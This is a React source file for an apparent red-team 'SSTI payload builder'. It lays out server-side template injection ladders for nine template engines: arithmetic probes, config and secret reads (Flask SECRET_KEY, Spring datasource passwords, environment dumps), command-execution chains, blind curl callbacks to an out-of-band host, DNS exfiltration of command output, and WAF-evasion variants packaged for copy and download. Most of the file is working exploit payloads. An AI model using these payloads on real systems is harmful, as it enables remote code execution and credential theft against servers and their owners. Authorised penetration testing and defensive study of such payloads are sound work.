import { useMemo, useState } from 'react';
import {
  Callout,
  Callout as Note,
  Card,
  Checkbox,
  CopyChip,
  DownloadButton,
  OutputBlock,
  SectionTitle,
  Select,
  Slider,
  Tabs,
  TextInput,
} from '@/components/ui';
import { WAF_TRANSFORMS } from '@/lib/redteam-data';
import { DEFAULT_OOB_DOMAIN } from '@/tools/registry';

type Engine = 'jinja2' | 'twig' | 'freemarker' | 'velocity' | 'smarty' | 'erb' | 'handlebars' | 'thymeleaf' | 'spel';
type Objective = 'probe' | 'version' | 'config' | 'rce';

interface Ladder {
  probe: string;
  probeAnswer: string;
  confirm: string;
  confirmAnswer: string;
  exploit: string;
  exploitAnswer: string;
  notes: string;
}

const ENGINES: Array<{ value: Engine; label: string }> = [
  { value: 'jinja2', label: 'Jinja2 (Python)' },
  { value: 'twig', label: 'Twig (PHP)' },
  { value: 'freemarker', label: 'FreeMarker (Java)' },
  { value: 'velocity', label: 'Velocity (Java)' },
  { value: 'smarty', label: 'Smarty (PHP)' },
  { value: 'erb', label: 'ERB (Ruby)' },
  { value: 'handlebars', label: 'Handlebars (Node)' },
  { value: 'thymeleaf', label: 'Thymeleaf (Spring)' },
  { value: 'spel', label: 'Spring EL (SpEL)' },
];

const OBJECTIVES: Array<{ value: Objective; label: string }> = [
  { value: 'probe', label: 'Arithmetic probe only' },
  { value: 'version', label: 'Version disclosure' },
  { value: 'config', label: 'Configuration read' },
  { value: 'rce', label: 'Command execution' },
];

/** `O` is replaced with the OAST host at render time. */
const LADDERS: Record<Engine, Ladder> = {
  jinja2: {
    probe: '{{7*7}}',
    probeAnswer: '49 — expression evaluated. {{7*"7"}} returning 7777777 proves string repetition, i.e. real Jinja, not Twig',
    confirm: "{{config.items()|list}}",
    confirmAnswer: 'A list of (key, value) config pairs including SECRET_KEY — the app object is exposed',
    exploit: "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    exploitAnswer: 'uid=33(www-data) — command output rendered in place',
    notes: 'Blind variant: {{ lipsum.__globals__["o"+"s"].popen("curl O").read() }} fires an OAST callback',
  },
  twig: {
    probe: '{{7*7}}',
    probeAnswer: '49 — but {{7*"7"}} errors, which distinguishes Twig from Jinja2',
    confirm: "{{['id']|filter('system')}}",
    confirmAnswer: 'Command output, when the `filter` function is enabled (Twig < 2.x, or non-sandboxed)',
    exploit: "{{['curl O']|filter('system')}}",
    exploitAnswer: 'No body output — the OAST hit is the only proof',
    notes: 'Twig 1.x/2.x differ: _self.env.registerUndefinedFilterCallback + getFilter(\'exec\') works pre-1.20',
  },
  freemarker: {
    probe: '${7*7}',
    probeAnswer: '49 rendered as text — FreeMarker interpolation',
    confirm: '${.version}',
    confirmAnswer: 'e.g. 2.3.31 — version drives which exploit chain is available',
    exploit: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    exploitAnswer: 'uid=0(root) when the Execute class is not blocked (FreeMarker >= 2.3.17 needs allowlist off)',
    notes: 'API-based variant: ObjectConstructor + Runtime.exec, blocked by FreeMarkerSafeResolver in 2.3.30+',
  },
  velocity: {
    probe: '#set($x=7*7)$x',
    probeAnswer: '49 — Velocity evaluates the directive and prints the variable',
    confirm: '$class.inspect("java.lang.Runtime").type',
    confirmAnswer: 'class java.lang.Runtime — introspection is reachable',
    exploit: '#set($rt=$class.inspect("java.lang.Runtime").type)#set($ch=$rt.getRuntime().exec("id"))$ch.waitFor()',
    exploitAnswer: 'No body output; verify with #set($s=$ch.getInputStream()) and a reader pump, or via OAST',
    notes: 'Velocity 2.x disables $class by default; 1.7 exposes it',
  },
  smarty: {
    probe: '{"7"*7}',
    probeAnswer: '49 — Smarty 3+ security-mode dependent; {7*7} also works without quotes in 3.x',
    confirm: '{$smarty.version}',
    confirmAnswer: 'Smarty-3.1.33 — version gates the {php} tag and static-method calls',
    exploit: '{system("id")}',
    exploitAnswer: 'uid=33(www-data) when the function is not filtered by security policy',
    notes: 'static-method variant: Smarty_Internal_Utility::clearAllAssign() — behaviour differs by patch level',
  },
  erb: {
    probe: '<%= 7*7 %>',
    probeAnswer: '49 — Ruby code executed inside the template',
    confirm: '<%= RUBY_VERSION %>',
    confirmAnswer: 'e.g. 3.2.2 — Ruby major version picks the gadget vocabulary',
    exploit: "<%= IO.popen('id').read %>",
    exploitAnswer: 'uid=1000(app) — direct child-process output',
    notes: 'ERB is unbounded by design: any Ruby expression runs. Look for `<%=` in user-controlled fields',
  },
  handlebars: {
    probe: '{{7*7}}',
    probeAnswer: '{{7*7}} — literals are: 49 in Handlebars but not across all builds; treat arithmetic as unreliable',
    confirm: '{{#with "s" as |string|}}{{string.sub 1}}{{/with}}',
    confirmAnswer: 'sub called on a String prototype — prototype access is available',
    exploit: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}',
    exploitAnswer: 'Only proof is the constructor chain firing (CVE-2019-19919 family); use an OAST payload',
    notes: 'Modern Handlebars blocks prototype access; older versions reach Function via constructor.constructor',
  },
  thymeleaf: {
    probe: '${7*7}',
    probeAnswer: '49 — Spring EL inside a Thymeleaf fragment',
    confirm: '__${7*7}__',
    confirmAnswer: 'Preprocessed expression: __${…}__ is evaluated before parsing, which is the actual injection vector',
    exploit: '__${T(java.lang.Runtime).getRuntime().exec("id")}__',
    exploitAnswer: 'Blind; use __${T(java.lang.Runtime).getRuntime().exec("curl O")}__ for a callback',
    notes: 'Only fragments that return a template name are injectable; ${…} in text nodes is escaped by default',
  },
  spel: {
    probe: '${7*7}',
    probeAnswer: '49 — expression evaluated by the Spring EL parser',
    confirm: '${T(java.lang.System).getenv()}',
    confirmAnswer: 'Environment map — arbitrary type access is permitted',
    exploit: '${T(java.lang.Runtime).getRuntime().exec("id")}',
    exploitAnswer: 'Blind; String[] arguments need the new String[]{...} form on newer JDKs',
    notes: 'JDK 15+ needs the simpler ${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","O"})} shape',
  },
};

export default function SstiPayloadBuilder() {
  const [engine, setEngine] = useState<Engine>('jinja2');
  const [objective, setObjective] = useState<Objective>('probe');
  const [oast, setOast] = useState(DEFAULT_OOB_DOMAIN);
  const [transforms, setWarn] = useState<string[]>([]);
  const [view, setView] = useState<'ladder' | 'table' | 'blind'>('ladder');
  const [auto, setAuto] = useState(true);

  const host = oast.trim() || DEFAULT_OOB_DOMAIN;
  const ladder = LADDERS[engine];
  const engLabel = ENGINES.find((e) => e.value === engine)!.label;

  const withOast = (s: string) => s.replace(/ O\b/g, ` ${host}`).replace(/\\bO\\b/g, host);

  const steps = useMemo(() => {
    const rows: Array<[string, string, string]> = [
      ['1 · probe', withOast(ladder.probe), ladder.probeAnswer],
    ];
    if (objective !== 'probe') rows.push(['2 · confirm', withOast(ladder.confirm), ladder.confirmAnswer]);
    if (objective === 'version') rows.push(['3 · version', versionPayload(engine), versionAnswer(engine)]);
    if (objective === 'config') rows.push(['3 · config', configPayload(engine), configAnswer(engine)]);
    if (objective === 'rce') rows.push(['3 · exploit', withOast(ladder.exploit), ladder.exploitAnswer]);
    return rows;
  }, [engine, objective, host, ladder]);

  const table = useMemo(
    () =>
      ENGINES.map((e) => ({
        engine: e.label,
        probe: LADDERS[e.value].probe,
        answer: LADDERS[e.value].probeAnswer.split(' — ')[0] ?? '',
        rce: LADDERS[e.value].exploit,
      })),
    [],
  );

  const variants = useMemo(() => {
    const base = withOast(ladder.exploit);
    return WAF_TRANSFORMS.filter(([name]) => (auto ? true : transforms.includes(name))).map(([name, fn]) => ({
      name,
      payload: fn(base),
    }));
  }, [ladder.exploit, host, auto, transforms, engine]);

  const bundle = useMemo(
    () =>
      [
        `# ${engLabel} — objective: ${objective}`,
        `# OAST host: ${host}`,
        ...steps.map(([label, payload, expected]) => `\n## ${label}\n${payload}\n# expected: ${expected}`),
      ].join('\n'),
    [engLabel, objective, host, steps],
  );

  return (
    <>
      <Card title="Target engine">
        <div className="grid gap-4 sm:grid-cols-2">
          <Select label="Template engine" value={engine} onChange={setEngine} options={ENGINES} hint={ladder.notes} />
          <Select label="Objective" value={objective} onChange={setObjective} options={OBJECTIVES} hint={objective === 'rce' ? 'Stop at confirm unless the engagement allows command execution' : objective === 'probe' ? 'Arithmetic only — safest first test' : 'Escalates one level past confirmation'} />
          <TextInput label="OAST domain" value={oast} onChange={setOast} mono placeholder={DEFAULT_OOB_DOMAIN} hint="Blind payloads replace the `O` token with this host" />
          <div className="flex items-end pb-2">
            <Checkbox checked={auto} onChange={setAuto} label="Apply all WAF transforms" description="Off: use the hand-picked list below" />
          </div>
        </div>
        {!auto && (
          <div className="mt-3 grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
            {WAF_TRANSFORMS.map(([name]) => (
              <Checkbox
                key={name}
                checked={transforms.includes(name)}
                onChange={(on) => setWarn((prev) => (on ? [...prev, name] : prev.filter((x) => x !== name)))}
                label={name}
              />
            ))}
          </div>
        )}
      </Card>

      <Card
        title="Detection ladder"
        action={<DownloadButton text={bundle} filename={`ssti-${engine}.txt`} label="Download .txt" />}
      >
        <Tabs
          value={view}
          onChange={setView}
          tabs={[
            { value: 'ladder', label: 'Ladder' },
            { value: 'table', label: 'All engines' },
            { value: 'blind', label: 'Blind / OAST' },
          ]}
        />
        <div className="mt-3">
          {view === 'ladder' && (
            <div className="space-y-3">
              {steps.map(([label, payload, expected]) => (
                <div key={label} className="rounded border border-[var(--card-border)] px-3 py-2">
                  <div className="mb-1 flex items-center justify-between gap-2">
                    <span className="text-[11px] uppercase tracking-wide text-[var(--text-faint)]">{label}</span>
                    <CopyChip text={payload} label="copy" />
                  </div>
                  <div className="rf-mono break-all text-[12.5px] text-[var(--text)]">{payload}</div>
                  <div className="mt-1 text-[11.5px] text-[var(--text-muted)]">Expected: {expected}</div>
                </div>
              ))}
            </div>
          )}
          {view === 'table' && (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse text-[12px]">
                <thead>
                  <tr className="text-left text-[11px] uppercase tracking-wide text-[var(--text-faint)]">
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Engine</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Probe</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Answer</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">RCE</th>
                  </tr>
                </thead>
                <tbody>
                  {table.map((r) => (
                    <tr key={r.engine} className="align-top">
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text)]">{r.engine}</td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5"><CopyChip text={r.probe} /></td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{r.answer}</td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5"><CopyChip text={r.rce} /></td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
          {view === 'blind' && (
            <div className="space-y-3">
              <OutputBlock value={withOast(ladder.exploit)} rows={3} label="Blind callback payload" />
              <OutputBlock
                value={[
                  `# watch for a DNS or HTTP hit on ${host}`,
                  `tail -f access.log | grep --line-buffered ${host}`,
                  `# python http.server alternative:`,
                  `python3 -m http.server 8080   # then check the request line for the payload markers`,
                ].join('\n')}
                rows={4}
                label="Listener"
              />
              <Note tone="info" title="Encoding reach">
                A URL-encoded callback (<span className="rf-mono">%3A%2F%2F</span> for <span className="rf-mono">://</span>) survives
                most query-string sanitisers; a DNS-only callback needs no scheme at all, so
                <span className="rf-mono"> nslookup `id`.{host}</span> shapes work when HTTP egress is filtered.
              </Note>
            </div>
          )}
        </div>
      </Card>

      <Card title="WAF / encoding variants">
        <SectionTitle right={<span className="text-[11.5px] text-[var(--text-faint)]">{variants.length} variants</span>}>
          Transformed exploit payloads
        </SectionTitle>
        <div className="flex flex-col gap-1.5">
          {variants.map((v) => (
            <div key={v.name} className="flex items-center gap-2 rounded border border-[var(--card-border)] px-2 py-1">
              <span className="w-[130px] shrink-0 text-[11px] text-[var(--text-faint)]">{v.name}</span>
              <CopyChip text={v.payload} label={v.payload.length > 70 ? `${v.payload.slice(0, 70)}…` : v.payload} />
            </div>
          ))}
        </div>
        <div className="mt-4">
          <Callout tone="warn" title="Order matters">
            Encoding is applied to the whole expression. Send the raw ladder first, then each variant as a separate
            request with a unique marker so the response diff tells you which transform the filter tolerated.
          </Callout>
        </div>
      </Card>
    </>
  );
}

function versionPayload(e: Engine): string {
  return {
    jinja2: '{{config.__class__.__init__.__globals__["os"].environ}}',
    twig: '{{constant("PHP_VERSION")}}',
    freemarker: '${.version}',
    velocity: '$class.inspect("java.lang.System").type',
    smarty: '{$smarty.version}',
    erb: '<%= RUBY_VERSION %>',
    handlebars: '{{#each this}}{{@root}}{{/each}}',
    thymeleaf: '${T(java.lang.System).getProperty("java.version")}',
    spel: '${T(java.lang.System).getProperty("java.version")}',
  }[e];
}

function versionAnswer(e: Engine): string {
  return {
    jinja2: 'A dict of environment variables — doubles as a config read',
    twig: 'Version string, e.g. 8.2.12',
    freemarker: 'e.g. 2.3.31',
    velocity: 'Class descriptor for System — introspection is open',
    smarty: 'Smarty-3.1.33 / Smarty-4.x',
    erb: 'Ruby runtime version',
    handlebars: 'Root object echo; version is not directly reachable — fingerprint by feature tests instead',
    thymeleaf: 'Java runtime version, e.g. 17.0.9',
    spel: 'Java runtime version, e.g. 17.0.9',
  }[e];
}

function configPayload(e: Engine): string {
  return {
    jinja2: '{{config.items()|list}}',
    twig: '{{_self.env.getExtension("core").getFilters()|keys|join(",")}}',
    freemarker: '${.globals}',
    velocity: '$class.inspect("java.lang.System").type.getenv()',
    smarty: '{$smarty.const._DB_PASSWORD}',
    erb: '<%= ENV.inspect %>',
    handlebars: '{{#with (lookup this "env")}}{{/with}}',
    thymeleaf: "${@environment.getProperty('server.port')}",
    spel: "${@environment.getProperty('spring.datasource.password')}",
  }[e];
}

function configAnswer(e: Engine): string {
  return {
    jinja2: 'Flask config dict including SECRET_KEY and DB URI',
    twig: 'Filter name list — confirms which functions are callable',
    freemarker: 'Shared variable map (usually small)',
    velocity: 'Environment map',
    smarty: 'Constant value, when the name is known',
    erb: 'Full ENV dump — credentials are usually in there',
    handlebars: 'No output on modern builds; prototype access is blocked',
    thymeleaf: 'Bean access via @environment — any Spring bean is reachable this way',
    spel: 'Same bean path; prefer a property you can confirm exists',
  }[e];
}
